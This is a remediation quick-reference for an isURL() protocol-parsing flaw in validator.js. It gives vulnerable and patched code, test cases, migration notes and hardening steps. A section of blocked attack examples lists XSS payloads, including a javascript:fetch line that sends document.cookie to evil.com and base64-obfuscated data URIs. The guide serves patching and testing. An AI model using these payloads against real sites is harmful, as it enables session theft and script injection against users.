# CVE-2025-56200 Quick Reference Guide

## TL;DR

**Vulnerability:** isURL() uses `'://'` to parse protocols; browsers use `':'`
**Impact:** XSS via `javascript:`, `data:`, `vbscript:` protocols bypass validation
**Severity:** CVSS 6.1 (Moderate)
**Fix:** Use `:` as delimiter and reject non-authority URIs

---

## Quick Test

### Is Your Code Vulnerable?

Run this test:

```javascript
const validator = require('validator');

console.log(validator.isURL('javascript:alert(1)'));
console.log(validator.isURL('data:text/html,<script>alert(1)</script>'));
```

**If either returns `true`, you are vulnerable.**

After patching, both should return `false`.

---

## The Patch (Lines 78-106 in src/lib/isURL.js)

### BEFORE (Vulnerable)
```javascript
split = url.split('://');
if (split.length > 1) {
  protocol = split.shift().toLowerCase();
  if (options.require_valid_protocol && options.protocols.indexOf(protocol) === -1) {
    return false;
  }
} else if (options.require_protocol) {
  return false;
} else if (url.slice(0, 2) === '//') {
  if (!options.allow_protocol_relative_urls) {
    return false;
  }
  split[0] = url.slice(2);
}
url = split.join('://');
```

### AFTER (Secure)
```javascript
const protocolMatch = url.match(/^([a-zA-Z][a-zA-Z0-9+.\-]*):(.*)$/);

if (protocolMatch) {
  protocol = protocolMatch[1].toLowerCase();
  const remainder = protocolMatch[2];

  if (options.require_valid_protocol && options.protocols.indexOf(protocol) === -1) {
    return false;
  }

  if (remainder.startsWith('//')) {
    url = remainder.substring(2);
  } else {
    return false; // Reject non-authority URIs
  }
} else if (options.require_protocol) {
  return false;
} else if (url.slice(0, 2) === '//') {
  if (!options.allow_protocol_relative_urls) {
    return false;
  }
  url = url.slice(2);
}
```

---

## What Gets Blocked Now?

### Dangerous URLs (Now Correctly Rejected) ✓

```javascript
validator.isURL('javascript:alert(1)')                              // false ✓
validator.isURL('data:text/html,<script>alert(1)</script>')         // false ✓
validator.isURL('vbscript:msgbox(1)')                               // false ✓
validator.isURL('mailto:test@example.com')                          // false ✓
validator.isURL('tel:+1234567890')                                  // false ✓
```

### Legitimate URLs (Still Work) ✓

```javascript
validator.isURL('http://example.com')                               // true ✓
validator.isURL('https://example.com')                              // true ✓
validator.isURL('ftp://example.com')                                // true ✓
validator.isURL('example.com')                                      // true ✓
validator.isURL('//example.com', { allow_protocol_relative_urls: true }) // true ✓
```

---

## Apply the Patch

### Option 1: Manual Patch

```bash
cd /Users/laptopname/validator.js
patch -p1 < CVE-2025-56200.patch
npm run build
npm test
```

### Option 2: Direct File Edit

1. Open `/Users/laptopname/validator.js/src/lib/isURL.js`
2. Replace lines 78-106 with the AFTER code above
3. Save and rebuild:
   ```bash
   npm run build
   npm test
   ```

---

## Test Cases to Add

Add to `test/validators.test.js`:

```javascript
it('should reject dangerous protocol URIs (CVE-2025-56200)', () => {
  test({
    validator: 'isURL',
    valid: [
      'http://example.com',
      'https://example.com',
      'ftp://example.com',
    ],
    invalid: [
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox(1)',
      'mailto:test@example.com',
    ],
  });
});
```

---

## Migration Guide

### URLs That Will Now Be Rejected

1. **Email addresses in URL format:**
   ```javascript
   // Before: validator.isURL('mailto:test@example.com')
   // After:  validator.isEmail('test@example.com')
   ```

2. **Phone numbers in URL format:**
   ```javascript
   // Before: validator.isURL('tel:+1234567890')
   // After:  Write custom validator or use tel-specific library
   ```

3. **Data URIs:**
   ```javascript
   // Before: validator.isURL('data:text/html,...')
   // After:  validator.isDataURI('data:text/html,...')
   ```

---

## Why This Works

### The Problem
```
URL:     javascript:alert(1)
Browser: "javascript" is the protocol ← DANGER!
Old Code: split('://') → No protocol detected ← MISS!
```

### The Fix
```
URL:     javascript:alert(1)
Browser: "javascript" is the protocol
New Code: match(/^([a-z...]*):/) → "javascript" detected
          remainder = "alert(1)" (no '//')
          → Non-authority URI → REJECT ← CAUGHT!
```

---

## Attack Examples Blocked

### XSS Payloads
```javascript
javascript:alert(document.cookie)
javascript:fetch('https://evil.com?c='+document.cookie)
data:text/html,<script>alert(1)</script>
data:image/svg+xml,<svg onload=alert(1)>
vbscript:msgbox("XSS")
```

### Obfuscated Attacks
```javascript
javascript:alert(String.fromCharCode(88,83,83))
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
JavaScript:alert(1)  // case variation
JAVASCRIPT:alert(1)
```

---

## Additional Security Measures

### 1. Content Security Policy
```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'">
```

### 2. Protocol Whitelist
```javascript
validator.isURL(url, {
  protocols: ['http', 'https'],  // Only allow HTTP(S)
  require_valid_protocol: true
})
```

### 3. Output Encoding
```javascript
const DOMPurify = require('dompurify');
const safeUrl = DOMPurify.sanitize(url, {
  ALLOWED_URI_REGEXP: /^https?:/
});
```

### 4. Server-Side Validation
```javascript
// Always validate on the server, not just client
app.post('/submit-url', (req, res) => {
  const { url } = req.body;

  if (!validator.isURL(url, {
    protocols: ['http', 'https'],
    require_valid_protocol: true
  })) {
    return res.status(400).json({ error: 'Invalid URL' });
  }

  // ... process URL
});
```

---

## Verification Checklist

- [ ] Patch applied to `src/lib/isURL.js`
- [ ] Code rebuilt (`npm run build`)
- [ ] Tests pass (`npm test`)
- [ ] New CVE tests added
- [ ] `javascript:alert(1)` returns `false`
- [ ] `data:text/html,...` returns `false`
- [ ] `http://example.com` still returns `true`
- [ ] Application tested with common URLs
- [ ] Security audit performed on URL usage
- [ ] CSP headers configured
- [ ] Output encoding implemented

---

## Support & Questions

**Documentation:**
- Full Analysis: `CVE-2025-56200-ANALYSIS.md`
- Patch Details: `CVE-2025-56200-PATCH.md`
- Test Suite: `test-cve-2025-56200.js`

**References:**
- RFC 3986: https://datatracker.ietf.org/doc/html/rfc3986
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- GitHub Advisory: GHSA-9965-vmph-33xx

**Testing:**
```bash
# Run vulnerability demonstration
node analyze_vulnerability.js

# Run CVE-specific tests
node test-cve-2025-56200.js
```

---

## Timeline

1. **Apply patch immediately** - Critical security fix
2. **Test thoroughly** - Ensure no regression
3. **Deploy to staging** - Verify in production-like environment
4. **Monitor for issues** - Check application logs
5. **Deploy to production** - Roll out the fix
6. **Security audit** - Review URL handling throughout app

---

## Key Takeaways

1. **The Issue:** `://` vs `:` for protocol parsing
2. **The Impact:** XSS via javascript:, data:, vbscript:
3. **The Fix:** RFC 3986 compliant parsing + reject non-authority URIs
4. **The Result:** Dangerous protocols blocked, legitimate URLs still work

**Apply this patch immediately to protect against XSS attacks.**
